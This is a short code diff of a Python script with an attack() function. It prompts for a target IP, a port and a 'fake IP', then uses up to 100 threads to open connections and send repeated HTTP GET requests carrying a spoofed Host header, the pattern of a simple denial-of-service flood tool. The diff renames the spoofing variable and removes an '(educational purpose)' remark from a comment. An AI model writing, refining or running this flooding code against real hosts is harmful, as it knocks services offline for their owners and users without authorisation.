@@ -12,7 +12,7 @@ logging.basicConfig(level=logging.INFO)
 # Parameters
 ip_addr = input("Enter target IP: ")  # Parameterized target IP
 port = int(input("Enter target port: "))  # Parameterized target port
-fk_ip = input("Enter fake IP: ")  # Parameterized fake IP
+mask_ip = input("Enter fake IP: ")  # Parameterized fake IP
 max_threads = 100  # Maximum threads for thread pool
 
 # stop event by ctrl+c
@@ -35,10 +35,10 @@ def attack():
             logging.info(f"Connected to {ip_addr}:{port}")
             
             # Send a fake request
-            socket_connection.sendto(f"GET / HTTP/1.1\r\nHost: {fk_ip}\r\n\r\n".encode('ascii'), (ip_addr, port))
+            socket_connection.sendto(f"GET / HTTP/1.1\r\nHost: {mask_ip}\r\n\r\n".encode('ascii'), (ip_addr, port))
             
-            # Sleep for a short period to simulate rate limiting (educational purpose)
-            time.sleep(0.1)  # Sleep for 100ms between requests
+            # Sleep for a short period to simulate rate limiting 
+            time.sleep(0.1)  # Sleep for 0.1 second between requests
             
         except socket.error as e:
             logging.error(f"Socket error: {e}")
